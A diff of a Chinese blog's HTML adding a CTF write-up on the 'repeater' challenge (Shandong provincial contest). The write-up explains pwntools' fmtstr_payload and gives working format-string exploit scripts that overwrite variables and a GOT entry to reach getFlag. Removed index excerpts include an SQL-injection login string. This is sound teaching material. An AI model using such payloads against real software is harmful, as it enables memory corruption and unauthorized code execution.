@@ -15,7 +15,7 @@
     <meta name="description" content="">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>threst&#39;s Blog</title>
+    <title>pwn之路_repeater(山东省赛) · threst&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -70,6 +70,8 @@
 
     <link rel="preload" href= /css/style.css?v=20180501 as="style" onload="this.onload=null;this.rel='stylesheet'" />
     <link rel="stylesheet" href= /css/mobile.css?v=20180501 media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
         
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
@@ -191,12 +193,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >threst&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">pwn之路_repeater(山东省赛)</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>threst's Blog</a>
 </header>
@@ -210,24 +223,67 @@
 
 
 
+height:50vh;
+
 >
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/repeater.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            pwn之路_repeater(山东省赛)
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "pwn">pwn</a>
+    
+</div>
+            
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2018/11/14</span>
+                
+                <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                    <span class="iconfont-archer">&#xe602;</span>
+                    <span id="busuanzi_value_page_pv"></span>
+                </span>
+                
+                <span class="shareWrapper">
+                    <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                    <span class="shareText">Share</span>
+                    <ul class="shareList">
+                        <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                            <div class="share-qrcode"></div>
+                        </li>
+                        <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                        <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                        <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                        <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                    </ul>
+                </span>
+            </div>
         
     </div>
 </div>
@@ -331,240 +387,93 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="repeater"><a href="#repeater" class="headerlink" title="repeater"></a>repeater</h2><p>考点:格式化字符串漏洞</p>
+<h2 id="pwntools知识点"><a href="#pwntools知识点" class="headerlink" title="pwntools知识点"></a>pwntools知识点</h2><p><code>fmtstr_payload</code>是<code>pwntools</code>提供的函数，用于自动生成格式化字符串。</p>
+<p><code>fmtstr_payload</code>有两个参数,第一个参数是int，用于表示取参数的偏移个数,第二个参数是字典，字典的意义是往key的地址，写入value的值</p>
+<p><code>fmtstr_payload(7, {printf_got: system_add})</code></p>
+<p>这个函数调用会往<code>printf_got</code>中写入<code>system_add</code></p>
+<h2 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h2><p>此题为简单的格式化字符串漏洞，首先总览分析一下程序，循环受<code>totalcount</code>次数限制，初始值为1。</p>
+<p><img src="https://www.superbed.cn/pic/5beae1459dc6d6bf0f3b6ff8" alt=""></p>
+<p>程序提供了 <code>getFlag</code> 方法，但是需要变量 <code>number</code>为 <code>0x2018</code> 才会执行命令。</p>
+<p><img src="https://www.superbed.cn/pic/5beae1459dc6d6bf0f3b6ff9" alt=""></p>
+<h2 id="一个一个kill"><a href="#一个一个kill" class="headerlink" title="一个一个kill"></a>一个一个kill</h2><h3 id="totalcount"><a href="#totalcount" class="headerlink" title="totalcount"></a>totalcount</h3><p>接下来思路就很清晰了，首先改写<code>totalcount</code>变量，使得循环执行更多次。</p>
+<p><img src="https://www.superbed.cn/pic/5beae4eb9dc6d6bf0f3b6ffa" alt=""></p>
+<p><code>totalcount</code>的地址为<code>0x0804A064</code>,所以要将其修改为3</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(4,&#123;0x0804A064:0x3&#125;)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+<h3 id="number"><a href="#number" class="headerlink" title="number"></a>number</h3><p>然后改写 number 为 <code>0x2018</code>。同样我们要在<code>.data</code>中寻找number的值</p>
+<p><img src="https://www.superbed.cn/pic/5beae63c9dc6d6bf0f3b6ffd" alt=""></p>
+<p><code>20h</code>转为１０进制就是2018</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(4,&#123;0x0804A060:0x2018&#125;)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+<h3 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h3><p>在最开始的图中我们可以知道，格式化字符串输出后就调用了<code>puts</code>函数，我们要做的就是将<code>puts</code>其地址修改为<code>getflag</code>函数的地址,最后调用 <code>getFlag</code>方法获取 Flag。</p>
+<p>那么我们现在有了新问题，怎么找到<code>puts</code>的地址和<code>getflag</code>的地址？介绍两种方法</p>
+<h4 id="方法1-puts"><a href="#方法1-puts" class="headerlink" title="方法1(puts)"></a>方法1(puts)</h4><p>使用<code>objdump -R repeater</code>命令</p>
+<p><img src="https://www.superbed.cn/pic/5beae8ca9dc6d6bf0f3b6ffe" alt=""></p>
+<p>地址为<code>0x0804a014</code></p>
+<h4 id="方法2-puts"><a href="#方法2-puts" class="headerlink" title="方法2(puts)"></a>方法2(puts)</h4><p>ida找got表</p>
+<p><img src="https://www.superbed.cn/pic/5beae93c9dc6d6bf0f3b6fff" alt=""></p>
+<h4 id="getflag地址"><a href="#getflag地址" class="headerlink" title="getflag地址"></a>getflag地址</h4><p>直接ida打开就行</p>
+<p><img src="https://www.superbed.cn/pic/5beae9d29dc6d6bf0f3b7001" alt=""></p>
+<p>框框中的地址好像都可以用</p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>好了现在我们有了<code>puts</code>的地址<code>0x0804a014</code>,<code>getflag</code>的地址<code>0x080485B6</code></p>
+<p>脚本如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(4,&#123;0x804a014:0x080485B6&#125;)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>最后代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./repeater'</span>)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">4</span>,&#123;<span class="number">0x0804A064</span>:<span class="number">0x3</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = fmtstr_payload(<span class="number">4</span>,&#123;<span class="number">0x0804A060</span>:<span class="number">0x2018</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = fmtstr_payload(<span class="number">4</span>,&#123;<span class="number">0x804a014</span>:<span class="number">0x080485B6</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="小知识点"><a href="#小知识点" class="headerlink" title="小知识点"></a>小知识点</h2><h4 id="1-寻找偏移量"><a href="#1-寻找偏移量" class="headerlink" title="1.寻找偏移量"></a>1.寻找偏移量</h4><p>看输出判断,比如这个题的偏移量为４，我们这样来确定</p>
+<p>输入<code>AAAA.%x.%x.%x.%x.%x.%x.%x</code>,查看打印的字符<code>41414141</code>在<code>AAAA</code>后面第几个偏移量就为多少,这个是第４个，所以偏移量为4.</p>
+<p><img src="https://www.superbed.cn/pic/5beaec089dc6d6bf0f3b7003" alt=""></p>
+<p>我们再来一个,源码来自ctf-wiki中格式化字符串</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* example/overflow/overflow.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">123</span>, b = <span class="number">456</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> c = <span class="number">789</span>;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;c);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified c."</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified a for a small number."</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == <span class="number">0x12345678</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified b for a big number!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译下<code>gcc -m32 -fno-stack-protector -no-pie -o overflow overflow.c</code></p>
+<p><img src="https://www.superbed.cn/pic/5beaed379dc6d6bf0f3b7006" alt=""></p>
+<p>根据上面讲的，这个的偏移量就是6,我们尝试下修改<code>a</code>的值</p>
+<p><img src="https://www.superbed.cn/pic/5beaedd49dc6d6bf0f3b7009" alt=""></p>
+<p>首先找到<code>a</code>地址为<code>0x0804C024</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./overflow'</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;<span class="number">0x0804C024</span>:<span class="number">0x2</span>&#125;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.superbed.cn/pic/5beaeec59dc6d6bf0f3b700b" alt=""></p>
+<p>成功修改,同理修改<code>b</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./overflow'</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;<span class="number">0x0804C028</span>:<span class="number">0x12345678</span>&#125;)<span class="comment">#b的地址为28</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.superbed.cn/pic/5beaef279dc6d6bf0f3b700c" alt=""></p>
+
+    </article>
+    <!-- license  -->
     
-    
-    
-        <article class="index-post">
-            <a class="abstract-title" href = "/2018/10/16/install/" >
-                
-                    <span>parrot安装</span>
-            </a>
-            <div class="abstract-content">
-                下载系统网站:https://www.parrotsec.org/download.php
-镜像制作:Etcherhttps://etcher.io/
-支持3平台，很好用
-更新系统换源sudo vim /etc/apt/sources.list.d/parrot.list添加清华源deb http://mirrors.tuna.tsinghua.edu.cn/parrot/ parrot main contrib non-free
-更新
-apt-get updateapt-get dist-upgrade
-安装搜狗输入法安装fcitxsudo apt-get install fcitx
-...
-            </div>
-            <div class="abstract-post-meta">
-                <!-- date  -->
-                <div class="abstract-date">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/10/16</span>
-                </div>
-                <!-- tags  -->
-                
-                <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "系统">系统</a>
-    
-</div>
-                
-            </div>
-        </article>
-    
-    
-    
-        <article class="index-post">
-            <a class="abstract-title" href = "/2018/10/14/极客大挑战/" >
-                
-                    <span>极客大挑战wp</span>
-            </a>
-            <div class="abstract-content">
-                初来乍到查看源码
-flag: SYC{View_Page_Source_to_Get_Flag} 
-代号为geek的行动第二幕：废弃的地下黑客论坛登录框,放到sqlmap上面跑了下，没有注入，可是根据The sql you execute in final :select * from users where username=&#39;admin&#39;&quot;&quot;&#39; and password=&#39;admi
-判断可能是王能密码，尝试username=admin&#39; or 1=1-- -&amp;password=admin
-结果提示hack!!! Th...
-            </div>
-            <div class="abstract-post-meta">
-                <!-- date  -->
-                <div class="abstract-date">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/10/14</span>
-                </div>
-                <!-- tags  -->
-                
-                <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-</div>
-                
-            </div>
-        </article>
-    
-    
-    
-        <article class="index-post">
-            <a class="abstract-title" href = "/2018/10/04/csaw2018wp/" >
-                
-                    <span>csaw 2018 wp</span>
-            </a>
-            <div class="abstract-content">
-                首发安全脉搏:https://www.secpulse.com/archives/75785.html
-cryptobabycrypto题目123456yeeeeeeeeeeeeeeeeeeeeeeeeeeeeeetsingle yeet yeeted with single yeet == 0yeeetwhat is yeet?yeet is yeetYeetdate: yeeted yeet at yeet: 9:42 pm
-提示single yeet yeeted with single yeet == 0想到a XOR a == 0,可能是单字的xor加密
-ciphertext
-...
-            </div>
-            <div class="abstract-post-meta">
-                <!-- date  -->
-                <div class="abstract-date">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/10/04</span>
-                </div>
-                <!-- tags  -->
-                
-                <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-</div>
-                
-            </div>
-        </article>
-    
-    
-    
-        <article class="index-post">
-            <a class="abstract-title" href = "/2018/10/04/Netcat/" >
-                
-                    <span>netcat食用指南</span>
-            </a>
-            <div class="abstract-content">
-                阿里云ecs:47.106.230.228目标机kali:校园网
-可以输入nc -h查看帮助：123456789101112131415161718-h 查看帮助信息-d 后台模式-g gateway source-routing hop point[s], up to 8-G num source-routing pointer: 4, 8, 12, …-e prog程序重定向，一但连接就执行［危险］-i secs延时的间隔-l 监听模式，用于入站连接-L 监听模式，连接天闭后仍然继续监听，直到CTR+C-n IP地址，不能用域名(不使用DNS反向查询IP地址的域名)-o film记录...
-            </div>
-            <div class="abstract-post-meta">
-                <!-- date  -->
-                <div class="abstract-date">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/10/04</span>
-                </div>
-                <!-- tags  -->
-                
-                <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "netcat">netcat</a>
-    
-</div>
-                
-            </div>
-        </article>
-    
-    
-    
-        <article class="index-post">
-            <a class="abstract-title" href = "/2018/10/04/php安全/" >
-                
-                    <span>php安全</span>
-            </a>
-            <div class="abstract-content">
-                0x01 PHP敏感配置项register_globals(php版本小于5.4时存在)当该配置项为ON时，会把用户通过GET、POST提交的参数自动注册成全局变量。当代码中存在有未初始化的变量时，可能会导致变量覆盖的问题；
-(PS:其中参数覆盖的顺序受到配置文件中variables_order的参数影响，默认是EGPCS。按顺序，右边的参数来源会覆盖左边的的参数来源)
-allow_url_include(php版本大于5.2默认为off)当该配置项为ON时，可以通过include、require等函数进行远程文件包含
-其中有个类似的配置项是allow_url_fopen，这个参数配置为...
-            </div>
-            <div class="abstract-post-meta">
-                <!-- date  -->
-                <div class="abstract-date">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/10/04</span>
-                </div>
-                <!-- tags  -->
-                
-                <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "php">php</a>
-    
-</div>
-                
-            </div>
-        </article>
-    
-    
-    
-        <article class="index-post">
-            <a class="abstract-title" href = "/2018/10/04/phpgd绕过/" >
-                
-                    <span>phpgd绕过</span>
-            </a>
-            <div class="abstract-content">
-                源码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341...
-            </div>
-            <div class="abstract-post-meta">
-                <!-- date  -->
-                <div class="abstract-date">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/10/04</span>
-                </div>
-                <!-- tags  -->
-                
-                <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "php">php</a>
-    
-</div>
-                
-            </div>
-        </article>
-    
-    
-    
-        <article class="index-post">
-            <a class="abstract-title" href = "/2018/10/04/tjctf2018misc/" >
-                
-                    <span>tjctf2018wp</span>
-            </a>
-            <div class="abstract-content">
-                Trippystrings be37fef78cfd6c7deda71154f567e6d0cfefbda1f80698c064bab469d3a54c58_trippy.gif | grep tjctf
-Interference1.将v1和v2用stegsolveadd下，保存图片，在改变图片的偏移量，找到黑白的二维码，用windows反色，扫描出flag2.compare v1.png v2.png output.png再把output.png用stegsolve调至黑白，windows反色.
-Grid Parser
-解压文件，发现有个password.png，用binwalk提取出...
-            </div>
-            <div class="abstract-post-meta">
-                <!-- date  -->
-                <div class="abstract-date">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/10/04</span>
-                </div>
-                <!-- tags  -->
-                
-                <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-</div>
-                
-            </div>
-        </article>
-    
-    
-    
-        <article class="index-post">
-            <a class="abstract-title" href = "/2018/10/04/网鼎杯wp/" >
-                
-                    <span>网鼎杯wp</span>
-            </a>
-            <div class="abstract-content">
-                网鼎杯wp套娃打开文件看见很多图片,首先判断lsb,用工具zsteg,一张一张试，试到第六张zsteg 6.png出flag1234567imagedata           .. text: &quot;-+,554$&amp;&amp;&quot;b1,rgb,lsb,xy       .. text: &quot;^;lI;bN$&quot;b1,bgr,lsb,xy       .. text: &quot;+flag&#123;03a253f5-8e93-4533-bcfc-af908830095d&#125;\nq&quot;b2,b,msb,xy         .. f...
-            </div>
-            <div class="abstract-post-meta">
-                <!-- date  -->
-                <div class="abstract-date">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/10/04</span>
-                </div>
-                <!-- tags  -->
-                
-                <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-</div>
-                
-            </div>
-        </article>
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://threst.github.io">threst</a>
+            <p>原文链接: <a href="https://threst.github.io/2018/11/14/pwn_repeater/">https://threst.github.io/2018/11/14/pwn_repeater/</a>
+            <p>发表日期: <a href="https://threst.github.io/2018/11/14/pwn_repeater/">November 14th 2018, 9:50:13</a>
+            <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/11/11/ctf/" title= 无处安放的wp(不定期更) >
+                    <div class="prevTitle">无处安放的wp(不定期更)</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!--PC版-->
+
+    <!--PC版-->
+
+
+    
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -632,6 +541,24 @@ Grid Parser
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#repeater"><span class="toc-number">1.</span> <span class="toc-text">repeater</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwntools知识点"><span class="toc-number">2.</span> <span class="toc-text">pwntools知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析代码"><span class="toc-number">3.</span> <span class="toc-text">分析代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一个一个kill"><span class="toc-number">4.</span> <span class="toc-text">一个一个kill</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#totalcount"><span class="toc-number">4.1.</span> <span class="toc-text">totalcount</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#number"><span class="toc-number">4.2.</span> <span class="toc-text">number</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getflag"><span class="toc-number">4.3.</span> <span class="toc-text">getflag</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#方法1-puts"><span class="toc-number">4.3.1.</span> <span class="toc-text">方法1(puts)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#方法2-puts"><span class="toc-number">4.3.2.</span> <span class="toc-text">方法2(puts)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#getflag地址"><span class="toc-number">4.3.3.</span> <span class="toc-text">getflag地址</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-number">5.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">6.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小知识点"><span class="toc-number">7.</span> <span class="toc-text">小知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-寻找偏移量"><span class="toc-number">7.0.1.</span> <span class="toc-text">1.寻找偏移量</span></a></li></ol></li></ol></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1339,6 +1266,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
     
     </body>
 </html>
